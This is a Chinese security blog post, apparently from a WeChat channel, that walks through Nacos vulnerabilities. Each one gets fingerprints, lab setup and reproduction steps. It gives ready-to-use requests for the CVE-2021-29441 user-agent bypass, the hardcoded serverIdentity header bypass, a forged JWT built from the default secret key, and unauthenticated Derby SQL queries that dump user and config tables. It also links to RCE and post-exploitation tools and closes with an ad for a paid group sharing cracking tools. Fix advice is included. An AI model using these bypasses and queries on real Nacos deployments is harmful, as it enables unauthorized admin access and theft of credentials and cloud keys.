#  从0认识+识别+掌握nacos全漏洞(攻防常见洞)带指纹表和利用工具   
 猎洞时刻   2023-11-25 17:07  
  
还是按照之前的文章结构  
  
文章目录  
<table><tbody style="outline: 0px;visibility: visible;"><tr style="outline: 0px;visibility: visible;"><td width="129.33333333333334" valign="top" data-style="outline: 0px; word-break: break-all; hyphens: auto; border-color: rgb(76, 76, 76); visibility: visible;" class="js_darkmode__0" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;">框架介绍<br style="outline: 0px;visibility: visible;"/></td><td width="369" valign="top" data-style="outline: 0px; word-break: break-all; hyphens: auto; border-color: rgb(76, 76, 76); visibility: visible;" class="js_darkmode__1" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;">何为nacos</td></tr><tr style="outline: 0px;visibility: visible;"><td width="129.33333333333334" valign="top" data-style="outline: 0px; word-break: break-all; hyphens: auto; border-color: rgb(76, 76, 76); visibility: visible;" class="js_darkmode__4" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;">漏洞列表<br style="outline: 0px;visibility: visible;"/></td><td width="369" valign="top" data-style="outline: 0px; word-break: break-all; hyphens: auto; border-color: rgb(76, 76, 76); visibility: visible;" class="js_darkmode__5" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;"><span style="outline: 0px;letter-spacing: 0.578px;visibility: visible;"><span style="letter-spacing: 0.578px;text-wrap: wrap;">n</span><span style="letter-spacing: 0.578px;text-wrap: wrap;">a</span><span style="letter-spacing: 0.578px;text-wrap: wrap;">co</span><span style="letter-spacing: 0.578px;text-wrap: wrap;">s</span></span>漏洞全版本和指纹表<br style="outline: 0px;visibility: visible;"/></td></tr><tr style="outline: 0px;visibility: visible;"><td width="129.33333333333334" valign="top" data-style="outline: 0px; word-break: break-all; hyphens: auto; border-color: rgb(76, 76, 76); visibility: visible;" class="js_darkmode__6" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;">漏洞环境搭建<br style="outline: 0px;visibility: visible;"/></td><td width="369" valign="top" data-style="outline: 0px; word-break: break-all; hyphens: auto; border-color: rgb(76, 76, 76); visibility: visible;" class="js_darkmode__7" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;">手动搭建</td></tr><tr style="outline: 0px;visibility: visible;"><td valign="top" colspan="1" rowspan="1" width="109.33333333333334" data-style="outline: 0px; word-break: break-all; hyphens: auto; border-color: rgb(76, 76, 76); visibility: visible;" class="js_darkmode__8" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;">漏洞复现<br style="outline: 0px;visibility: visible;"/></td><td valign="top" colspan="1" rowspan="1" width="82" data-style="outline: 0px; word-break: break-all; hyphens: auto; border-color: rgb(76, 76, 76); visibility: visible;" class="js_darkmode__9" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;">1.如何识别当前站点是否存在漏洞</td></tr><tr style="outline: 0px;visibility: visible;"><td valign="top" colspan="1" rowspan="1" width="109.33333333333334" data-style="outline: 0px; word-break: break-all; hyphens: auto; border-color: rgb(76, 76, 76); visibility: visible;" class="js_darkmode__10" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;"><br/></td><td valign="top" colspan="1" rowspan="1" width="82" data-style="outline: 0px; word-break: break-all; hyphens: auto; border-color: rgb(76, 76, 76); visibility: visible;" class="js_darkmode__11" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;">2.哪些版本(情况)存在该漏洞<br style="outline: 0px;visibility: visible;"/></td></tr><tr style="outline: 0px;visibility: visible;"><td valign="top" colspan="1" rowspan="1" width="109.33333333333334" data-style="outline: 0px; word-break: break-all; hyphens: auto; border-color: rgb(76, 76, 76); visibility: visible;" class="js_darkmode__12" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;"><br/></td><td valign="top" colspan="1" rowspan="1" width="82" data-style="outline: 0px; word-break: break-all; hyphens: auto; border-color: rgb(76, 76, 76); visibility: visible;" class="js_darkmode__13" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;">3.漏洞指纹特征⭐<br style="outline: 0px;visibility: visible;"/></td></tr><tr style="outline: 0px;visibility: visible;"><td valign="top" colspan="1" rowspan="1" width="109.33333333333334" data-style="outline: 0px; word-break: break-all; hyphens: auto; border-color: rgb(76, 76, 76); visibility: visible;" class="js_darkmode__14" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;"><br/></td><td valign="top" colspan="1" rowspan="1" width="82" data-style="outline: 0px; word-break: break-all; hyphens: auto; border-color: rgb(76, 76, 76); visibility: visible;" class="js_darkmode__15" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;">4.如何复现<br style="outline: 0px;visibility: visible;"/></td></tr><tr style="outline: 0px;visibility: visible;"><td valign="top" colspan="1" rowspan="1" data-style="outline: 0px; word-break: break-all; hyphens: auto; border-color: rgb(76, 76, 76); visibility: visible;" class="js_darkmode__18" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;">工具<br style="outline: 0px;visibility: visible;"/></td><td valign="top" colspan="1" rowspan="1" data-style="outline: 0px; word-break: break-all; hyphens: auto; border-color: rgb(76, 76, 76);" class="js_darkmode__19" style="outline: 0px;word-break: break-all;hyphens: auto;border-color: rgb(76, 76, 76);visibility: visible;"><span style="letter-spacing: 0.578px;text-wrap: wrap;">综合利用工具</span></td></tr></tbody></table>  
  
  
> >> **Part 1**  
  
  
  
  
  
  
  
01  
  
何为  
n  
a  
co  
s  
  
Nacos 是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。致力于帮助发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，可以快速实现动态服务发现、服务配置、服务元数据及流量管理。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoB5GHgCKptkhXA6VUTtOyv7vnhLpPnykM3DiboGEWIsYdarFXLu1qODEFkTzZ4jKTaKVZNhFlr51A/640?wx_fmt=png&from=appmsg "")  
  
国内企业常用,hw中常见,且利用难度低  
  
  
> >> **Part 2**  
  
  
  
  
  
  
  
02  
  
漏洞列表和指纹表  
<table><tbody><tr><td width="141" valign="top" style="word-break: break-all;">CVE-2021-29441 Nacos权限认证绕过漏洞</td><td width="396" valign="top" style="word-break: break-all;">/nacos/v1/auth/users?pageNo=1&amp;pageSize=1</td></tr><tr><td width="288" valign="top" style="word-break: break-all;">secret.key 默认密钥 CNVD-2023674205</td><td width="396" valign="top" style="word-break: break-all;"><span style="letter-spacing: 0.578px;text-wrap: wrap;">/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&amp;search=accurate返回403就可以考虑伪造jwt</span></td></tr><tr><td width="288" valign="top" style="word-break: break-all;">CVE-2021-29441 Nacos权限认证绕过漏洞</td><td width="396" valign="top" style="word-break: break-all;">curl &#34;http://ip:端口/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&amp;search=blur&#34; -H &#34;serverIdentity: security&#34;<section data-mpa-preserve-tpl-color="t" data-mpa-template="t" mpa-preserve="t" mpa-from-tpl="t" style="letter-spacing: 0.578px;text-wrap: wrap;"><pre></pre></section></td></tr><tr><td width="288" valign="top" style="word-break: break-all;"><span style="text-wrap: wrap;font-size: 16px;letter-spacing: 0.034em;">Nacos 集群 Raft 反序列化漏洞 CNVD-2023-45001</span></td><td width="396" valign="top" style="word-break: break-all;"><span style="color: rgb(18, 18, 18);font-family: -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Microsoft YaHei&#34;, &#34;Source Han Sans SC&#34;, &#34;Noto Sans CJK SC&#34;, &#34;WenQuanYi Micro Hei&#34;, sans-serif;font-size: medium;letter-spacing: normal;text-align: start;text-wrap: wrap;background-color: rgb(255, 255, 255);">开放7848端口</span><br/></td></tr><tr><td valign="top" colspan="1" rowspan="1" style="word-break: break-all;">sql注入<br/></td><td valign="top" colspan="1" rowspan="1" style="word-break: break-all;"><p><span style="font-size: 17px;letter-spacing: 0.578px;text-decoration: none;">derby数据库</span></p><p>/nacos/v1/cs/ops/derby?sql=select+*+from+sys.systables</p></td></tr></tbody></table>```


```  
  
> >> **Part 3**  
  
  
  
  
  
  
  
03  
  
前置知识  
  
Nacos 默认帐户名密码：  
  
```
nacos/nacos
```  
  
  
常见端口为8848****  
  
**可能存在的未授权 API**  
  
0x01 用户信息 API  
  
```
/nacos/v1/auth/users?pageNo=1&pageSize=9
```  
  
  
0x02 集群信息 API  
```
/nacos/v1/core/cluster/nodes?withInstances=false&pageNo=1&pageSize=10&keyword=
```  
  
  
0x03 配置信息 API  
```
/nacos/v1/cs/configs?dataId=&group=&appName=&config_tags=&pageNo=1&pageSize=9&tenant=&search=accurate&accessToken=&username=
```  
  
  
这一接口在未授权的情况下可能会暴露MySQL、Redis、Druid  postgresql   mongodb等配置信息，若存在云环境、文件系统，还可能暴露各种key,举几个例子 accessKey、secretKey  
微信key...  
  
获取配置信息示例：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoxicFhOx1LvUhXrHhvsC4Xoa6uPtF48vO3dlxbltf8u4rPH8FNhCCwuI8HvxjgBxUaAcd5iaoTiaYLA/640?wx_fmt=png&from=appmsg "")  
  
获取ak、sk 示例：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoxicFhOx1LvUhXrHhvsC4XopXuSrjCZHywTKv3ufa2evsOVVUqgXt8RLzs6wgekPicibIiaLu2nVnuHQ/640?wx_fmt=png&from=appmsg "")  
  
如果返回为 403 Forbidden，可以尝试 CNVD-2023674205 漏洞绕过限制。  
  
**0x04 nacos+spring**  
  
因为nacos经常会和spring actuator 一起出现,如果nacos没漏洞，那就有可能从actuator中的heapdump获取密码  
  
就是actuator/heapdump,麋鹿在前段时间的spring那一篇讲过  
  
> >> **Part 4**  
  
  
  
  
  
  
  
02  
  
漏洞搭建与复现  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mfPo9TiaS3coAKiaKLLG0Apn3z0m0xkTfPGXWiaDTW2z0bZ2rDvLiaNiaSPTmcux3pzc8hsTMsj4h360Hfuax7pltmA/640?wx_fmt=png "")  
  
CVE-2021-29441 Nacos权限认证绕过漏洞  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibwbKh16rrm4yUEtxo5kFpqxcbTE8tDVW3PEPKaMia7XxibwcCvvHprfN0ic1Aq0DpUksLnJvU7IFuWmWmxticKKr8g/640?wx_fmt=png "")  
  
  
  
**1.影响版本**  
  
Nacos <= 2.0.0-ALPHA.1  
  
**2.环境搭建**  
  
```
下载环境
 wget https://github.com/alibaba/nacos/releases/download/2.0.0-ALPHA.1/nacos-server-2.0.0-ALPHA.1.tar.gz

解压
tar -zxvf nacos-server-2.0.0-ALPHA.1.tar.gz


进入目录
cd nacos
```  
  
  
cd 进入bin目录  
  
启动  
  
```
./startup.sh -m standalone
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoB5GHgCKptkhXA6VUTtOyvaiaKAxjkVdP7C65Z8wD8ohdR3P5ibFBRhoRAw4fomN9b3nxaTjicNrlGQ/640?wx_fmt=png&from=appmsg "")  
  
访问ip:8848/nacos/#/login  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoB5GHgCKptkhXA6VUTtOyvH6Eia6eozGD4qhFNd2E4EcQjazQpeqtDjjxb7bGr1Djusrehra04VdQ/640?wx_fmt=png&from=appmsg "")  
  
搭建完成,开始复现(本人靶机ip为192.168.233.131,故后续地址采用此地址)  
  
**3,漏洞复现**  
  
3.1    验证漏洞  
  
访问如下地址查看用户列表  
  
```
http://192.168.233.131:8848/nacos/v1/auth/users?pageNo=1&pageSize=1
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoB5GHgCKptkhXA6VUTtOyvOtscwO8nTaFL19nmvMZoJmibRia8eK1jzQ9ic1cfKgM5Pr45PsIUjL34A/640?wx_fmt=png&from=appmsg "")  
  
虽然有password了, 但是是加盐过的,解密不了  
  
3.2    添加一个账号密码  
  
POST    访问    /nacos/v1/auth/users  
  
添加POST参数  
  
username=milu&password=milu  
  
修改ua为          
Nacos-Server  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoB5GHgCKptkhXA6VUTtOyviboib30zGSQxYRhG1Ele8ibbrxqeSU5N4AaJITMq2Veg0KSspeAQlgwhg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoB5GHgCKptkhXA6VUTtOyv3T7friaRvcLibn5XdsMsEjtXPffnkaIcxJiaswo2yTP0GSaZJ3EDXwFKA/640?wx_fmt=png&from=appmsg "")  
  
200ok  
  
3.3    用milu,milu去登录  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoB5GHgCKptkhXA6VUTtOyvsKLjKYW36xDOxX5KibmiaHpEHwKFG3gx8rlM4icp442bTAnYicXjscyvFQ/640?wx_fmt=png&from=appmsg "")  
  
关闭环境  
  
./shutdown.sh  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mfPo9TiaS3coAKiaKLLG0Apn3z0m0xkTfPGXWiaDTW2z0bZ2rDvLiaNiaSPTmcux3pzc8hsTMsj4h360Hfuax7pltmA/640?wx_fmt=png "")  
  
secret.key 默认密钥   
CNVD-2023674205  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibwbKh16rrm4yUEtxo5kFpqxcbTE8tDVW3PEPKaMia7XxibwcCvvHprfN0ic1Aq0DpUksLnJvU7IFuWmWmxticKKr8g/640?wx_fmt=png "")  
  
  
  
  
**1.漏洞描述:**  
  
Nacos使用token.secret.key来进行身份认证和加密。  
在  
Nacos版本 <= 2.2.0 时,，这个密钥  
是固定的默认值，导致存在一个安全漏洞。  
  
这个默认值是  
  
```
nacos.core.auth.plugin.nacos.token.secret.key=SecretKey012345678901234567890123456789012345678901234567890123456789
```  
  
  
攻击者可以利用这个默认密钥构造JWT，绕过身份认证并进入Nacos后台，从而对系统进行控制。  
  
**2.影响版本**  
  
如上所述,Nacos <= 2.2.0  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoB5GHgCKptkhXA6VUTtOyvIK3MgwAEy6ibQACibG0b8H3HibYPhtnsb1Ye4IQhURFonI3NOnAicvAtUQ/640?wx_fmt=png&from=appmsg "")  
  
  
**4.搭建环境**  
  
和上面一样,只不过这次github地址换为  
  
https://github.com/alibaba/nacos/releases/download/2.2.0/nacos-server-2.2.0.tar.gz  
  
看一眼conf/application.properties里的  
  
nacos.core.auth.plugin.nacos.token.secret.key  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoB5GHgCKptkhXA6VUTtOyviclGenTlyjwDuBwtTLLdQD8ndHb4Le8Z5621p6udJqUqD9MIWeC5wSg/640?wx_fmt=png&from=appmsg "")  
  
确实是默认的  
  
而且nacos.core.auth.enabled的值为false,也就是默认没有开启权限认证  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoB5GHgCKptkhXA6VUTtOyve93zgyFMLQlNh92a5kIfZVibHLs6KAFUu8MDvtbW9BTjQBfiaGTuBB3A/640?wx_fmt=png&from=appmsg "")  
  
需要修改为true  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoB5GHgCKptkhXA6VUTtOyv4enXBGtlwqj079vT4Ht0M92EljUmsZMovt563YrwmU5Cibr60Jb8mgQ/640?wx_fmt=png&from=appmsg "")  
  
**4.漏洞复现**  
  
4.1验证漏洞  
  
不带jwt直接访问如下地址,返回403  
  
/nacos/v1/auth/users?pageNo=1&pageSize=9&search=accurate  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoB5GHgCKptkhXA6VUTtOyvFSWq7j2bkKkSOZ21iaibbUkMj9G9y9olGl7wPicS6jK6j0OG3AzbjjEKQ/640?wx_fmt=png&from=appmsg "")  
  
4.1构造  
jwt token  
  
Nacos 使用 jwt token，算法为 HS256，将 secret.key 的默认值当作 secretKey，生成Signature。jwt token 的 Payload 为 subject（用户名）和 exp（有效期）。  
  
payload  
  
```
{
  "sub": "nacos",
  "exp": 1700677870
}
```  
  
  
时间戳修改为比当前时间晚一点,麋鹿当前时间是11-22,我生成的时间戳是后一天即23号  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoB5GHgCKptkhXA6VUTtOyvicT9SuwRnfFAfAGatM1X0MQHiaTia25TruicQryW0F4YDyxPInkaNqhuWA/640?wx_fmt=png&from=appmsg "")  
  
```
jwt构造网站

https://jwt.io/


时间戳生成网站

https://tool.lu/timestamp/
```  
  
  
生成jwt(记得写key)  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoB5GHgCKptkhXA6VUTtOyv4JqEhXzibNJCZpHIQThibF0Hh4aMibOn8uSoJE5gmscjsL6d7ia8sSia9iaA/640?wx_fmt=png&from=appmsg "")  
  
jwt token格式  
  
```
accessToken:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTcwMDY3Nzg3MH0.ILVfXA4ccGutdcQSh_BcbzAgYVIseDrghQ3n3mgVNkE
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoB5GHgCKptkhXA6VUTtOyvUBFOgas3cic3k9nv9WcKXJbDgBSiaRo9mn5q7ibcj4CWMAiaW5GoB6nsiag/640?wx_fmt=png&from=appmsg "")  
  
**5.对于鉴权的一些思考**  
  
我去看了看官方文档,发现鉴权是这样写的  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoB5GHgCKptkhXA6VUTtOyvWXicqThiaCFS5U2RVOQNdKnpGjZpoAmCiaGE512ibdwa6KpBTecLgRfOgQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoB5GHgCKptkhXA6VUTtOyvxR8aw2wU0GGBWVOicFUVd87iaYTr2Unt5CIzXfuNISnFJgrM4lbicvLSA/640?wx_fmt=png&from=appmsg "")  
  
所以  
  
1.如果不修改nacos.core.auth.enabled  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoB5GHgCKptkhXA6VUTtOyvibC3ZfIO3a4m7UZWxp2OlmJibopUcTOF41VXWToseUicUZGEsDv9PhYNw/640?wx_fmt=png&from=appmsg "")  
  
也就是说不  
开启权限认证****  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoB5GHgCKptkhXA6VUTtOyvIdJKd6DMwMNCgnvgNC4DicjI7PrCW4BEpzgxF57IibUVgnHjiahSJHTTg/640?wx_fmt=png&from=appmsg "")  
  
是不需要用jwt的  
  
2.上一个未授权里提到修改ua头,在低版本可以靠ua头绕过  
  
3.  
application.properties里默认server.identity为如下  
```
nacos.core.auth.server.identity.key=serverIdentity
nacos.core.auth.server.identity.value=security
```  
  
所以这样也是可以绕过  
```
curl "http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&pageSize=9&search=blur" -H "serverIdentity: security"
```  
  
  
**6.修复**  
  
1.2.0版本及以上的nacos，修改配置文件中的nacos.core.auth.plugin.nacos.token.secret.key即可,  
否则无法启动节点。  
  
1.1.4版本及以下的nacos，由于私钥写死到了代码里，用户无法自行配置，只能升级nacos到2,2,1以上版本  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mfPo9TiaS3coAKiaKLLG0Apn3z0m0xkTfPGXWiaDTW2z0bZ2rDvLiaNiaSPTmcux3pzc8hsTMsj4h360Hfuax7pltmA/640?wx_fmt=png "")  
  
CVE-2021-29441 Nacos权限认证绕过漏洞  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibwbKh16rrm4yUEtxo5kFpqxcbTE8tDVW3PEPKaMia7XxibwcCvvHprfN0ic1Aq0DpUksLnJvU7IFuWmWmxticKKr8g/640?wx_fmt=png "")  
  
  
  
细心的读者应该发现上面提到过这个问题  
  
**1,漏洞产因**  
  
当开启 Nacos 权限认证（nacos.core.auth.enabled=true）后，配置文件中存在默认值：  
  
```
nacos.core.auth.server.identity.key=serverIdentity 
nacos.core.auth.server.identity.value=security
```  
  
  
该硬编  
码导致攻击者可以构造携带该 key 和 value 的请求，从而绕过权限认证。  
  
**2.漏洞影响版本**  
  
Nacos <= 2.2.0  
  
**3.复现**  
  
指纹  
  
```
curl "http://192.168.233.131:8848/nacos/v1/auth/users?pageNo=1&pageSize=9&search=blur" -H "serverIdentity: security"
```  
  
  
正常是不能访问的.403  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoxicFhOx1LvUhXrHhvsC4XobaUTVib6a58v1PwcyMfVCeicMkwhSibrZHugnr1GwHEMyTSKiaegAGOFrA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoxicFhOx1LvUhXrHhvsC4XoHVE4nbXEY4czMlUAOj7d91VzLIibG0ygHtuvycI7z8nxqWseOl5ibYOg/640?wx_fmt=png&from=appmsg "")  
  
但是用上面curl命令返回结果是这样  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoxicFhOx1LvUhXrHhvsC4XoHae7xJfNXmur4zJYxcsmibokBhDzFicibHWCFrDyZfTiaEbV1WfVnGomkw/640?wx_fmt=png&from=appmsg "")  
  
添加用户  
  
```
POST /v1/auth/users HTTP/1.1
serverIdentity: security
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoxicFhOx1LvUhXrHhvsC4XotqKAz80wA4tlslkeEEa5OH4WrHju1Kic9ZaUlQoSU5vssITOxSEGiaIw/640?wx_fmt=png&from=appmsg "")  
  
**4.漏洞修复**  
  
4.1    配置自定义身份识别的 key（不可为空）和 value（不可为空）：  
  
```
nacos.core.auth.server.identity.key=example
nacos.core.auth.server.identity.value=example
```  
  
  
4.2    升级  
  
****  
![](https://mmbiz.qpic.cn/mmbiz_png/mfPo9TiaS3coAKiaKLLG0Apn3z0m0xkTfPGXWiaDTW2z0bZ2rDvLiaNiaSPTmcux3pzc8hsTMsj4h360Hfuax7pltmA/640?wx_fmt=png "")  
  
Nacos 集群 Raft 反序列化漏洞 CNVD-2023-45001  
![](https://mmbiz.qpic.cn/mmbiz_png/ibwbKh16rrm4yUEtxo5kFpqxcbTE8tDVW3PEPKaMia7XxibwcCvvHprfN0ic1Aq0DpUksLnJvU7IFuWmWmxticKKr8g/640?wx_fmt=png "")  
  
  
  
  
**1.漏洞描述**  
  
Nacos 在处理某些基于 Jraft 的请求时，采用 Hessian 进行反序列化，但并未设置限制，导致应用存在远程代码执行（RCE）漏洞。  
  
Nacos 1.x 在单机模式下默认不开放 7848 端口，故该情况通常不受此漏洞影响。  
Nacos 2.x 版本无论单机或集群模式均默认开放 7848 端口。  
  
所以开放7848端口的naos服务可以当作该洞的一个特征  
  
**2.漏洞影响**  
  
1.4.0 <= Nacos < 1.4.6 使用cluster集群模式运行  
  
2.0.0 <= Nacos < 2.2.3 任意模式启动  
  
**3.漏洞复现**  
  
提供一个现成工具  
  
https://github.com/c0olw/NacosRce/  
  
**4.漏洞修复**  
  
通用修补建议  
  
升级到Nacos 1.4.6、Nacos 2.2.3：  
  
```
https://github.com/alibaba/nacos/releases/tag/1.4.6
https://github.com/alibaba/nacos/releases/tag/2.2.3
```  
  
  
  
临时修补建议  
  
对外限制开放7848端口，一般使用时该端口为Nacos集群间Raft协议的通信端口，不承载客户端请求，因此老版本可以通过禁止该端口来自Nacos集群外的请求达到止血目的（如部署时已进行限制或未暴露，则风险可控）。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mfPo9TiaS3coAKiaKLLG0Apn3z0m0xkTfPGXWiaDTW2z0bZ2rDvLiaNiaSPTmcux3pzc8hsTMsj4h360Hfuax7pltmA/640?wx_fmt=png "")  
  
sql注入  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibwbKh16rrm4yUEtxo5kFpqxcbTE8tDVW3PEPKaMia7XxibwcCvvHprfN0ic1Aq0DpUksLnJvU7IFuWmWmxticKKr8g/640?wx_fmt=png "")  
  
  
  
  
**1,漏洞描述**  
  
Nacos config server 中有未鉴权接口，执行 SQL 语句可以查看敏感数据，可以执行任意的 SELECT 查询语句。  
  
**2.影响版本**  
  
使用derby数据库进行部署的Nacos  
  
**3.漏洞复现**  
  
  
```
/nacos/v1/cs/ops/derby?sql=select+*+from+sys.systables
/nacos/v1/cs/ops/derby?sql=select+st.tablename+from+sys.systables+st
```  
  
  
  
一些查询语句：  
  
```
select * from users
select * from permissions
select * from roles
select * from tenant_info
select * from tenant_capacity
select * from group_capacity
select * from config_tags_relation
select * from app_configdata_relation_pubs
select * from app_configdata_relation_subs
select * from app_list
select * from config_info_aggr
select * from config_info_tag
select * from config_info_beta
select * from his_config_info
select * from config_info
```  
  
  
  
  
> >> **Part 4**  
  
  
  
  
  
  
**放几个工具**  
  
反序列化漏洞利用工具  
  
```
https://github.com/c0olw/NacosRce/releases/tag/v0.5
```  
  
  
哥斯拉nacos后渗透插件  
  
```
https://github.com/pap1rman/postnacos
```  
  
  
综合利用,且gui版本  
  
```
https://github.com/charonlight/NacosExploitGUI
```  
  
  
  
# 欢迎加入内部圈子  
  
     
****  
更多更好的漏洞报告都在内部圈子中~！  
现在内部圈子，  
仅需68元便可永久加入！！一次付款终身享受！！！  
内部持续分享企业  
赏金SRC报告  
，  
CNVD报告  
，  
edusrc报告  
，还有各种各样的学习教程，学习文章，  
持续分享安全领域各大破解工具  
。  
扫描下面的二维码便可加入，有兴趣  
的表哥可以扫码预览圈子内容！！****  
  
![](https://mmbiz.qpic.cn/mmbiz_png/d6JIQYCSTH99IdArQvvY0iabWicX9bKTpobDrOCaGP6F5KibtxBK6qRk09oibOOSZvz1EtaibtobYqIAXy3tzMjCXvg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
加入群聊请加我微信，备注“加群”  
  
![](https://mmbiz.qpic.cn/mmbiz_png/d6JIQYCSTHibFyKL0pAnqJhjWnODDg40m2hExuNhPPVySVSdJmrCI0stNz5Yomg4lPWNMcxmBqSg6jUvp849GJA/640?wx_fmt=png&from=appmsg "")  
  
